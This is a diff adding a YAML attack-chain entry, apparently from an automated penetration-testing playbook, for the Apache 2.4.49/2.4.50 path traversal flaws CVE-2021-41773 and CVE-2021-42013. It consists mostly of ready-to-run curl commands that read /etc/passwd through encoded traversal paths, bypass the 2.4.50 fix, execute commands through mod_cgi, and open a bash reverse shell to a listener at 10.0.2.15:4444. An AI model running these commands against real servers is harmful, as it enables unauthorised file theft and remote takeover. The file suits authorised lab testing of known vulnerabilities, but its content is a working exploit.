@@ -1,0 +1,41 @@
+chain_id: cve_2021_41773_path_traversal
+title: "CVE-2021-41773 / 42013 — Apache 2.4.49-2.4.50 path traversal to RCE"
+severity: CRITICAL
+tags: [web, apache, cve-2021-41773, cve-2021-42013, path-traversal, rce]
+
+trigger:
+  any_of:
+    - { product_pattern: "(?i)apache.*2\\.4\\.(49|50)" }
+    - { banner_pattern: "(?i)apache/2\\.4\\.(49|50)" }
+
+description: |
+  Apache 2.4.49 (CVE-2021-41773) and 2.4.50 (the bypass — CVE-2021-42013)
+  ship with a path normalization bug. `mod_cgi` enabled + a writable
+  `/cgi-bin/` lifts traversal to RCE. Even without CGI, `/etc/passwd` is
+  readable in one curl.
+
+steps:
+  - id: 1
+    title: "File read — /etc/passwd in one shot"
+    command: curl --path-as-is "http://$VICTIMA/icons/.%2e/%2e%2e/%2e%2e/etc/passwd"
+
+  - id: 2
+    title: "Bypass for 2.4.50 (CVE-2021-42013)"
+    command: curl --path-as-is "http://$VICTIMA/icons/.%%32e/.%%32e/.%%32e/.%%32e/etc/passwd"
+
+  - id: 3
+    title: "RCE if mod_cgi is enabled"
+    command: |
+      curl -X POST --path-as-is --data 'echo Content-Type: text/plain; echo; id' \
+        "http://$VICTIMA/cgi-bin/.%2e/%2e%2e/%2e%2e/bin/sh"
+
+  - id: 4
+    title: "Reverse shell"
+    command: |
+      nc -lvnp 4444   # on Kali
+      curl -X POST --path-as-is --data 'echo Content-Type: text/plain; echo; bash -c "bash -i >& /dev/tcp/10.0.2.15/4444 0>&1"' \
+        "http://$VICTIMA/cgi-bin/.%2e/%2e%2e/%2e%2e/bin/sh"
+
+references:
+  - https://nvd.nist.gov/vuln/detail/CVE-2021-41773
+  - https://nvd.nist.gov/vuln/detail/CVE-2021-42013
